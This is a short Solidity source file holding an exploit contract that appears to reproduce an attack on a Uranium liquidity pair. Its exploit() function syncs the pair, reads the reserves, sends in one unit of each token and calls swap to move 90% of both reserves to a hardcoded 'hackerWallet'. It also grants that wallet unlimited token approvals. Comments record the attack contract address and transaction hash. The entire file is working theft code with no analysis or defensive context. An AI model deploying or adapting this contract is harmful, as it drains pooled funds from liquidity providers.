pragma solidity >=0.6.6;

import './IUraniumFactory.sol';
import './IUraniumPair.sol';
import './IERC20.sol';
import './SafeMath.sol';

contract Uranium {
    
    using SafeMath for uint;
    
    address private constant uraniumFactory = address(0xd0A1E359811322d97991E03f863a0C30C2cF029C);
    address private constant hackerWallet = address(0x03452348F6Eaa3AaE0e4B791d17F814B6320Af8E);
    uint256 approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    
    function exploit() external {
        address pair = address(0xC8A2a59Ca3663f1353dD47ca575073cfdff7e6e0); //2
        address token0 = IUraniumPair(pair).token0(); //3
        address token1 = IUraniumPair(pair).token1(); //4
        IERC20(token0).approve(hackerWallet, approveValue); //5
        IERC20(token1).approve(hackerWallet, approveValue); //6
        IUraniumPair(pair).sync(); //7
        (uint reserve0, uint reserve1,) = IUraniumPair(pair).getReserves(); //10
        IERC20(token0).transfer(pair, 1); //11
        IERC20(token1).transfer(pair, 1); //12
        IUraniumPair(pair).swap(reserve0.mul(9)/10, reserve1.mul(9)/10, hackerWallet, new bytes(0)); //13
    }
}

//hackContract 0x3DCF1f91311a66823fFEcA7df8e9138dEbcA17E1
//hackingTxHash 0xbd5d833268e0ab198fa03d37b727374ee503e8242067b814e0d7a773bd06a461